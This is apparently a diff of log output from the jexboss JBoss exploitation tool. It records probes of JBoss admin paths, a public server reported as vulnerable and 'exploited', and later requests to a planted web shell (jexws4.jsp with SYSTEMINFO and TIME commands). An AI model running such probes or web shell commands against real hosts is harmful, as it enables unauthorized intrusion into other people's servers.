+2018-03-09 00:37:34,532 (INFO): An error occurred while connecting to the host 192.168.1.43
+Traceback (most recent call last):
+  File "jexboss.py", line 299, in check_vul
+    r = gl_http_pool.request('GET', url, redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='192.168.1.43', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fcace90>: Failed to establish a new connection: [Errno 111] Connection refused',))
+2018-03-09 00:37:34,532 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a23579950>: Failed to establish a new connection: [Errno 111] Connection refused',)': /
+2018-03-09 00:37:34,532 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fcaced0>: Failed to establish a new connection: [Errno 111] Connection refused',)': /
+2018-03-09 00:37:34,533 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fcacf90>: Failed to establish a new connection: [Errno 111] Connection refused',)': /
+2018-03-09 00:37:34,533 (INFO): An error occurred while connecting to the host 192.168.1.43
+Traceback (most recent call last):
+  File "jexboss.py", line 276, in check_vul
+    r = gl_http_pool.request('GET', url, redirect=True, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='192.168.1.43', port=80): Max retries exceeded with url: / (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fc48190>: Failed to establish a new connection: [Errno 111] Connection refused',))
+2018-03-09 00:37:34,534 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a205539d0>: Failed to establish a new connection: [Errno 111] Connection refused',)': /web-console/Invoker
+2018-03-09 00:37:34,534 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fc8f2d0>: Failed to establish a new connection: [Errno 111] Connection refused',)': /web-console/Invoker
+2018-03-09 00:37:34,537 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fc8f410>: Failed to establish a new connection: [Errno 111] Connection refused',)': /web-console/Invoker
+2018-03-09 00:37:34,538 (INFO): An error occurred while connecting to the host 192.168.1.43
+Traceback (most recent call last):
+  File "jexboss.py", line 411, in check_vul
+    r = gl_http_pool.request('HEAD', url_to_check, redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='192.168.1.43', port=80): Max retries exceeded with url: /web-console/Invoker (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fc48290>: Failed to establish a new connection: [Errno 111] Connection refused',))
+2018-03-09 00:37:34,538 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fcacc90>: Failed to establish a new connection: [Errno 111] Connection refused',)': /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo
+2018-03-09 00:37:34,539 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fcace90>: Failed to establish a new connection: [Errno 111] Connection refused',)': /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo
+2018-03-09 00:37:34,544 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fc8f350>: Failed to establish a new connection: [Errno 111] Connection refused',)': /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo
+2018-03-09 00:37:34,544 (INFO): An error occurred while connecting to the host 192.168.1.43
+Traceback (most recent call last):
+  File "jexboss.py", line 424, in check_vul
+    r = gl_http_pool.request('HEAD', url + str(paths[vector]), redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='192.168.1.43', port=80): Max retries exceeded with url: /jmx-console/HtmlAdaptor?action=inspectMBean&name=jboss.system:type=ServerInfo (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fc48390>: Failed to establish a new connection: [Errno 111] Connection refused',))
+2018-03-09 00:37:34,545 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a205539d0>: Failed to establish a new connection: [Errno 111] Connection refused',)': /invoker/JMXInvokerServlet
+2018-03-09 00:37:34,551 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fcacdd0>: Failed to establish a new connection: [Errno 111] Connection refused',)': /invoker/JMXInvokerServlet
+2018-03-09 00:37:34,551 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fc480d0>: Failed to establish a new connection: [Errno 111] Connection refused',)': /invoker/JMXInvokerServlet
+2018-03-09 00:37:34,552 (INFO): An error occurred while connecting to the host 192.168.1.43
+Traceback (most recent call last):
+  File "jexboss.py", line 388, in check_vul
+    r = gl_http_pool.request('HEAD', url_to_check , redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='192.168.1.43', port=80): Max retries exceeded with url: /invoker/JMXInvokerServlet (Caused by NewConnectionError('<urllib3.connection.HTTPConnection object at 0x7f5a1fc48450>: Failed to establish a new connection: [Errno 111] Connection refused',))
+2018-03-09 00:39:29,130 (INFO): Checking Host: http://122.224.150.244/
+2018-03-09 00:40:38,243 (INFO): Checking Host: http://61.177.133.157:8880/
+2018-03-09 00:40:40,468 (INFO): Server http://61.177.133.157:8880/: VULNERABLE
+2018-03-09 00:41:05,004 (INFO): Server http://61.177.133.157:8880/ exploited!
+2018-03-09 00:43:28,574 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='61.177.133.157', port=8880): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=SYSTEMINFO
+2018-03-09 00:49:11,808 (WARNING): Retrying (Retry(total=2, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ProtocolError('Connection aborted.', BadStatusLine("''",))': //jexws4/jexws4.jsp?ppp=TIME
+2018-03-09 00:49:18,137 (WARNING): Retrying (Retry(total=1, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='61.177.133.157', port=8880): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=TIME
+2018-03-09 00:49:24,428 (WARNING): Retrying (Retry(total=0, connect=None, read=None, redirect=None, status=None)) after connection broken by 'ReadTimeoutError("HTTPConnectionPool(host='61.177.133.157', port=8880): Read timed out. (read timeout=6.0)",)': //jexws4/jexws4.jsp?ppp=TIME
+2018-03-09 00:49:30,745 (ERROR): Error contacting the command shell
+Traceback (most recent call last):
+  File "jexboss.py", line 775, in shell_http
+    r = gl_http_pool.request('GET', url + path + cmd, redirect=False, headers=headers)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 66, in request
+    **urlopen_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/request.py", line 87, in request_encode_url
+    return self.urlopen(method, url, **extra_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/poolmanager.py", line 321, in urlopen
+    response = conn.urlopen(method, u.request_uri, **kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 668, in urlopen
+    **response_kw)
+  File "/usr/lib/python2.7/dist-packages/urllib3/connectionpool.py", line 639, in urlopen
+    _stacktrace=sys.exc_info()[2])
+  File "/usr/lib/python2.7/dist-packages/urllib3/util/retry.py", line 388, in increment
+    raise MaxRetryError(_pool, url, error or ResponseError(cause))
+MaxRetryError: HTTPConnectionPool(host='61.177.133.157', port=8880): Max retries exceeded with url: //jexws4/jexws4.jsp?ppp=TIME (Caused by ReadTimeoutError("HTTPConnectionPool(host='61.177.133.157', port=8880): Read timed out. (read timeout=6.0)",))
